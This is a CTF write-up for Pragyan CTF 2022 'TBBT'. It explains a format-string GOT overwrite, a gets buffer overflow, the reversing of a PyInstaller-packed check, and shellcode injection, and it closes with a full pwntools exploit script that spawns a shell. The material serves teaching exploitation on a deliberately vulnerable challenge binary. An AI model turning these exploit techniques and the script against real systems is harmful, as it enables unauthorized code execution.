# Pragyan CTF 2022: TBBT

1) Its a shellcode injection with a format string vulnerability ahead of it, having to overflow a buffer and reversing a python binary to check the content of ```not_flag``` file.

```
gef➤  checksec 
[+] checksec for './vuln'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

2) Analyzing the binary in IDA/ghidra, we would be able to see a set of if-else statements in the main function. In the else statement for input validation of ```puts("\nGot good hot mustard? ");```, if you enter a character other than 1 or 2 it calls another function ```lin``` which takes in the character you entered as a parameter. We can also see that the address of main function being printed in the line ```Good. My order no. is ```.

3) Analyzing the lin function, we would be able see that our character input is checked with a set of values. Those values are stored in the global scope and can be checked by going through the ```.data``` section of the binary. ```objdump -d -s -j .data ./vuln``` prints out the disassembly of .data section and arr and its contents as well are printed 

```
./vuln:     file format elf32-i386

Contents of section .data:
 3580 00000000 84350000 00000000 00000000  .....5..........
 3590 00000000 00000000 00000000 00000000  ................
 35a0 20333435 36373839 3a3bef67 68696a6b   3456789:;.ghijk
 35b0 6c6d6e6f 70717273 74757677 78797a41  lmnopqrstuvwxyzA
 35c0 42434445 46474849 4a4b4c4d 4e4f5051  BCDEFGHIJKLMNOPQ
 35d0 52535455 56575859 5a00               RSTUVWXYZ.      

Disassembly of section .data:

00003580 <__data_start>:
    3580:	00 00                	add    %al,(%eax)
	...

00003584 <__dso_handle>:
    3584:	84 35 00 00 00 00 00 00 00 00 00 00 00 00 00 00     .5..............
	...

000035a0 <arr>:
    35a0:	20 33 34 35 36 37 38 39 3a 3b ef 67 68 69 6a 6b      3456789:;.ghijk
    35b0:	6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 41     lmnopqrstuvwxyzA
    35c0:	42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51     BCDEFGHIJKLMNOPQ
    35d0:	52 53 54 55 56 57 58 59 5a 00                       RSTUVWXYZ.
```

So with this we can choose our character input accordingly as the loop exits the program when it hits any of these characters.
Since Pie is enabled we cannot find the address of the functions as it keeps changing each time. Further examining the lin function we will be able to see that there is a format-string vulnerability.

```
    char f[BUFSIZE];
    fgets(f, BUFSIZE - 1, stdin);
    printf(f);
    fflush(stdin);
```

With this we can leak the place in the stack where our input is stored.
```
gef➤  r
Starting program: ./vuln 
Sheldon: Hello! May I know your name? 
ok

Good. My order no. is 0x565566a7
Did you get chicken with broccoli to be diced and not shredded? 

1.Yes
2.No
1

You sure? The menu description specifies shredded 

1.Yes
2.No
1

Got good hot mustard? 

1.Yes
2.No
?
Not a valid answer! 
But....
AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p
AAAAAAAA 0x7f 0xf7fb1580 0x56556517 0x2 0x7d4 0xb 0x41414141 0x41414141 0x20702520 0x25207025 0x70252070
```

So our input is stored in 7th position in the stack. Now with its possible to access two functions nic and hid. Also we can note that a variable is being set to 2 in the lin function. 

If we look into the hid function, the same variable is checked if it is not equal to two and exits if the statement is true. So we can access this function first.
Examining the function -
```
    if (c != 2)
    {
        exit(0);
    }
    c = 1;
    char f[BUFSIZE];
    gets(f);
    return;
```

We can see that there is a vulnerable gets call in this function leading to a buffer overflow. With this input buffer overflow, we can access the nic function.
Therefore, payload for the gets call will be ```(b'A'*128)+(b'A'*12)+p32(binary.sym.nic)```, where 128 is to write into the variable and 12 to overwrite other stuffs in the stack.

If we examine the ```nic``` function, 
```
(gdb) disas nic 
Dump of assembler code for function nic:
   0x000013ed <+0>:	endbr32 
   0x000013f1 <+4>:	push   ebp
   0x000013f2 <+5>:	mov    ebp,esp
   0x000013f4 <+7>:	push   ebx
   0x000013f5 <+8>:	sub    esp,0x64
   0x000013f8 <+11>:	call   0x12f0 <__x86.get_pc_thunk.bx>
   0x000013fd <+16>:	add    ebx,0x20fb
   0x00001403 <+22>:	mov    DWORD PTR [ebp-0x14],0x0
   0x0000140a <+29>:	mov    DWORD PTR [ebp-0x18],0x0
   0x00001411 <+36>:	sub    esp,0x8
   0x00001414 <+39>:	lea    eax,[ebx-0x14f0]
   0x0000141a <+45>:	push   eax
   0x0000141b <+46>:	lea    eax,[ebx-0x14ee]
   0x00001421 <+52>:	push   eax
   0x00001422 <+53>:	call   0x1270 <fopen@plt>
   0x00001427 <+58>:	add    esp,0x10
   0x0000142a <+61>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000142d <+64>:	sub    esp,0x4
   0x00001430 <+67>:	push   DWORD PTR [ebp-0xc]
   0x00001433 <+70>:	lea    eax,[ebp-0x18]
   0x00001436 <+73>:	push   eax
   0x00001437 <+74>:	lea    eax,[ebp-0x14]
   0x0000143a <+77>:	push   eax
   0x0000143b <+78>:	call   0x1190 <getline@plt>
   0x00001440 <+83>:	add    esp,0x10
   0x00001443 <+86>:	mov    DWORD PTR [ebp-0x10],eax
   0x00001446 <+89>:	sub    esp,0xc
   0x00001449 <+92>:	push   DWORD PTR [ebp-0xc]
   0x0000144c <+95>:	call   0x1200 <fclose@plt>
   0x00001451 <+100>:	add    esp,0x10
   0x00001454 <+103>:	sub    esp,0x8
   0x00001457 <+106>:	lea    eax,[ebp-0x40]
   0x0000145a <+109>:	push   eax
   0x0000145b <+110>:	lea    eax,[ebx-0x14e9]
   0x00001461 <+116>:	push   eax
   0x00001462 <+117>:	call   0x1290 <__isoc99_scanf@plt>
   0x00001467 <+122>:	add    esp,0x10
   0x0000146a <+125>:	mov    eax,DWORD PTR [ebp-0x14]
   0x0000146d <+128>:	sub    esp,0x8
   0x00001470 <+131>:	lea    edx,[ebp-0x40]
   0x00001473 <+134>:	push   edx
   0x00001474 <+135>:	push   eax
   0x00001475 <+136>:	call   0x1180 <strcmp@plt>
   0x0000147a <+141>:	add    esp,0x10
   0x0000147d <+144>:	cmp    eax,0xffffffff
   0x00001480 <+147>:	je     0x148d <nic+160>
   0x00001482 <+149>:	mov    eax,DWORD PTR [ebx+0xe8]
   0x00001488 <+155>:	cmp    eax,0x1
   0x0000148b <+158>:	je     0x1497 <nic+170>
   0x0000148d <+160>:	sub    esp,0xc
   0x00001490 <+163>:	push   0x0
   0x00001492 <+165>:	call   0x1240 <exit@plt>
   0x00001497 <+170>:	sub    esp,0xc
   0x0000149a <+173>:	lea    eax,[ebp-0x60]
--Type <RET> for more, q to quit, c to continue without paging--
   0x0000149d <+176>:	push   eax
   0x0000149e <+177>:	call   0x11c0 <gets@plt>
   0x000014a3 <+182>:	add    esp,0x10
   0x000014a6 <+185>:	lea    eax,[ebp-0x60]
   0x000014a9 <+188>:	call   eax
   0x000014ab <+190>:	nop
   0x000014ac <+191>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x000014af <+194>:	leave  
   0x000014b0 <+195>:	ret    
End of assembler dump.
```
We would be able to see a strcmp having an 'or' and with an exit call if the statement is not satisfied. We can also see a getline call. So a line is read from the ```not_flag``` file in the server and our input should be the same line as what is read. 

Now, if we check the other binary ```vuln1``` given to us. Its a python compiled binary and can be checked by ```strings vuln1 | grep py```.
Python script can be generated from this binary using 2 python packages pyinstxtractor, decompyle3 by running the following commands -

```
python3 pyinstxtractor.py vuln1
decompyle3 vuln1_extracted/vuln1.pyc
```

```
def lr(arr, n):
    for i in range(0, n):
        c = arr[0]
        for j in range(0, 11):
            arr[j] = arr[(j + 1)]
        else:
            arr[11] = c

    else:
        return arr


def alg2(arr, n, n2):
    arr2 = [i for i in range(12)]
    n3 = 0
    for i in range(n, n2 + 1):
        for j in range(0, 6):
            arr2[n3] = arr[i][j]
            n3 += 1

    else:
        return arr2


def alg1(arr):
    n = 0
    n2 = 11
    arr2 = [i for i in range(12)]
    for i in range(0, 12, 2):
        arr2[i] = arr[n2]
        arr2[i + 1] = arr[n]
        n2 -= 1
        n += 1
    else:
        return arr2


def alg(s, n):
    n2 = int(n / 2)
    n3 = n2 - 1
    arr = [i for i in range(n)]
    arr2 = [i for i in range(n)]
    for i in range(0, n, 2):
        arr[i] = s[n3]
        arr[i + 1] = s[n2]
        n3 -= 1
        n2 += 1
    else:
        for j in range(0, n):
            arr2[j] = arr[(n - (j ^ 1) - 1)]
        else:
            st = ''
            for i in arr2:
                st += i
            else:
                return st


def b(s):
    arr = [[0 for i in range(6)] for j in range(6)]
    n = 0
    for i in range(0, 6):
        for j in range(0, 6):
            if i % 2 == 0:
                arr[(5 - j)][i] = s[n]
            else:
                arr[j][i] = s[n]
            n += 1

    else:
        t = lr(alg1(alg2(arr, 0, 1)), 7)
        for i in lr(alg1(alg2(arr, 2, 3)), 8):
            t.append(i)
        else:
            for i in lr(alg1(alg2(arr, 4, 5)), 10):
                t.append(i)
            else:
                if alg(t, 36) == '__l3H40s4_lDn<_3_euyT4451_tt1hfmW1D1':
                    with open('not_flag', 'w') as f:
                        f.write(s)


fl = str(input())
try:
    b(fl)
except:
    print('invalid')
```

As we can see, this binary writes into the 'not_flag' file. So lets reverse this binary and get out input right in order to pass the check.
Our input is stored in a 6x6 matrix and then divided into three arrays with contents of 2 rows in each of them.
In the line from function b, ```lr(alg1(alg2(arr, 0, 1)), 7)```, there are three functions lr, alg1 and alg2. 
1) lr function rotates the given array to left and returns the rotated array and can be rotated easily by a right rotation. 
2) alg1 and alg2 functions can be reversed line-by-line as its shuffling of array elements.
3) Finally in alg function the elements are arranged back again to give the encoded string.
4) In b function, the encoded string is compared which can be used to decode the algorithm.

The exploit for this binary will be- 
```
def rr(arr, n):
    return arr[-n:]+arr[:-n]


def dalg1(a):
    a1 = []
    a2 = []

    for i in range(len(a)):
        if i % 2 == 0:
            a1.append(a[i])
        else:
            a2.append(a[i])

    return a2+a1[::-1]


def dalg2s(s):
    a1, a2, a3 = [], [], []
    for i in range(len(s)):
        a3.append(s[len(s)-(i ^ 1)-1])

    for i in range(len(a3)):
        if i % 2 == 0:
            a1.append(a3[i])
        else:
            a2.append(a3[i])

    return a1[::-1]+a2


r = dalg2s("__l3H40s4_lDn<_3_euyT4451_tt1hfmW1D1")

a, b, c = dalg1(rr(r[:12], 7)), dalg1(rr(r[12:24], 8)), dalg1(rr(r[24:], 10))
arr = [a[:6], a[6:], b[:6], b[6:], c[:6], c[6:]]

flr = ""

for i in range(len(arr)):
    for j in range(len(arr)):
        if i % 2 == 0:
            flr += arr[5-j][i]
        else:
            flr += arr[j][i]

print(flr)
```
After running this script, we will be able to see that the content os 'not_flag' file is ```5e1D0n_l11<3s_th4T_u_m4D3_1t_H4lfW4y```. So this should be our input for the prompt in nic function.

Since NX is disabled, we can inject a shellcode in the vulnerable gets call input buffer of nic function.

The overall exploit script- 

```
from pwn import *


binary = context.binary = ELF('./vuln')
context.bits = 32

p = process(binary.path)
p.sendlineafter("Sheldon: Hello! May I know your name? ", "peace")
p.recvuntil(b'Good. My order no. is ')

main = p.recvline().strip()
main = int(main, 16)
binary.address = main - binary.sym.main

p.sendlineafter("2.No", '1')
p.sendlineafter("2.No", '1')
p.sendlineafter("2.No", ')')

payload = fmtstr_payload(7, {binary.got.fflush: binary.sym.hid})
print(payload)
p.sendline(payload)

buf = b"A" * (140)
buf += p32(binary.sym.nic)

p.sendline(buf)
p.sendline("5e1D0n_l11<3s_th4T_u_m4D3_1t_H4lfW4y")

shellc = shellcraft.sh()
payload = asm(shellc)
p.sendline(payload)


p.interactive()
```